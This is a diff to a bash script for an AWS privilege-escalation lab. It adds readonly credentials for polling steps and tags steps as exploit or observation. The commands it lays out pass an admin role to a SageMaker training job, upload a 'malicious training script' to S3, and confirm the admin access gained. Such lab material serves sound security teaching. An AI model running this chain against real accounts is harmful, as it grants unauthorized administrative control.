@@ -69,6 +69,15 @@ if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; 
     exit 1
 fi
 
+# Extract readonly credentials for observation/polling steps
+READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
+READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)
+
+if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
+    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
+    exit 1
+fi
+
 # Get region
 AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
 
@@ -79,6 +88,7 @@ fi
 
 echo "Retrieved access key for: $STARTING_USER"
 echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
+echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
 echo "S3 Bucket: $BUCKET_NAME"
 echo "Passable Role ARN: $PASSABLE_ROLE_ARN"
 echo "Region: $AWS_REGION"
@@ -87,16 +97,25 @@ echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"
 # Navigate back to scenario directory
 cd - > /dev/null
 
-# Step 2: Configure AWS credentials with starting user
+# Credential switching helpers
+use_starting_creds() {
+    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
+    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
+    unset AWS_SESSION_TOKEN
+}
+use_readonly_creds() {
+    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
+    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
+    unset AWS_SESSION_TOKEN
+}
+
+# [EXPLOIT] Step 2: Verify starting user identity
 echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
-export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
-export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
+use_starting_creds
 export AWS_REGION=$AWS_REGION
-unset AWS_SESSION_TOKEN
 
 echo "Using region: $AWS_REGION"
 
-# Verify starting user identity
 show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
@@ -107,15 +126,17 @@ if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
 fi
 echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
-# Step 3: Get account ID
+# [OBSERVATION] Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
-show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text"
+use_readonly_creds
+show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 
-# Step 4: Verify we don't have admin permissions yet
+# [EXPLOIT] Step 4: Verify we don't have admin permissions yet
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
+use_starting_creds
 echo "Attempting to list IAM users (should fail)..."
 show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
@@ -154,8 +175,9 @@ EOF
 echo "Created exploit script: /tmp/$EXPLOIT_SCRIPT"
 echo -e "${GREEN}✓ Malicious training script created${NC}\n"
 
-# Step 6: Package and upload the exploit script to S3
+# [EXPLOIT] Step 6: Package and upload the exploit script to S3
 echo -e "${YELLOW}Step 6: Packaging and uploading exploit script to S3${NC}"
+use_starting_creds
 
 # SageMaker training jobs expect code to be packaged as a tar.gz file
 echo "Creating source.tar.gz package..."
@@ -164,7 +186,7 @@ tar -czf sourcedir.tar.gz $EXPLOIT_SCRIPT
 cd - > /dev/null
 
 echo "Uploading to: s3://$BUCKET_NAME/sourcedir.tar.gz"
-show_cmd "Attacker" "aws s3 cp /tmp/sourcedir.tar.gz s3://$BUCKET_NAME/sourcedir.tar.gz"
+show_attack_cmd "Attacker" "aws s3 cp /tmp/sourcedir.tar.gz s3://$BUCKET_NAME/sourcedir.tar.gz"
 aws s3 cp /tmp/sourcedir.tar.gz s3://$BUCKET_NAME/sourcedir.tar.gz
 
 echo -e "${GREEN}✓ Exploit script packaged and uploaded to S3${NC}\n"
@@ -206,8 +228,9 @@ CONTAINER_IMAGE="${ECR_ACCOUNT}.dkr.ecr.${AWS_REGION}.${ECR_DOMAIN}/pytorch-trai
 echo "Container image: $CONTAINER_IMAGE"
 echo -e "${GREEN}✓ Container image determined${NC}\n"
 
-# Step 8: Create SageMaker training job with admin role
+# [EXPLOIT] Step 8: Create SageMaker training job with admin role
 echo -e "${YELLOW}Step 8: Creating SageMaker training job with admin role${NC}"
+use_starting_creds
 echo "Training job name: $TRAINING_JOB_NAME"
 echo "Using role: $PASSABLE_ROLE_ARN"
 echo "This will take 3-5 minutes to provision and execute..."
@@ -250,8 +273,9 @@ aws sagemaker create-training-job \
 
 echo -e "${GREEN}✓ Training job created successfully${NC}\n"
 
-# Step 9: Wait for training job to complete
+# [OBSERVATION] Step 9: Wait for training job to complete
 echo -e "${YELLOW}Step 9: Waiting for training job to complete${NC}"
+use_readonly_creds
 echo "This typically takes 3-5 minutes..."
 echo "Status updates every 30 seconds:"
 echo ""
@@ -260,6 +284,7 @@ MAX_WAIT_SECONDS=600  # 10 minutes timeout
 ELAPSED=0
 
 while [ $ELAPSED -lt $MAX_WAIT_SECONDS ]; do
+    show_cmd "ReadOnly" "aws sagemaker describe-training-job --region $AWS_REGION --training-job-name $TRAINING_JOB_NAME --query 'TrainingJobStatus' --output text"
     STATUS=$(aws sagemaker describe-training-job \
         --region $AWS_REGION \
         --training-job-name $TRAINING_JOB_NAME \
@@ -275,6 +300,7 @@ while [ $ELAPSED -lt $MAX_WAIT_SECONDS ]; do
         echo -e "${RED}✗ Training job failed or was stopped${NC}"
 
         # Get failure reason if available
+        show_cmd "ReadOnly" "aws sagemaker describe-training-job --region $AWS_REGION --training-job-name $TRAINING_JOB_NAME --query 'FailureReason' --output text"
         FAILURE_REASON=$(aws sagemaker describe-training-job \
             --region $AWS_REGION \
             --training-job-name $TRAINING_JOB_NAME \
@@ -303,12 +329,13 @@ echo "Waiting 15 seconds for policy to propagate..."
 sleep 15
 echo -e "${GREEN}✓ Policy propagated${NC}\n"
 
-# Step 11: Verify administrator access
+# [OBSERVATION] Step 11: Verify administrator access
 echo -e "${YELLOW}Step 11: Verifying administrator access${NC}"
+use_readonly_creds
 echo "Attempting to list IAM users..."
 echo ""
 
-show_cmd "Attacker" "aws iam list-users --max-items 3 --output table"
+show_cmd "ReadOnly" "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
     echo ""
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
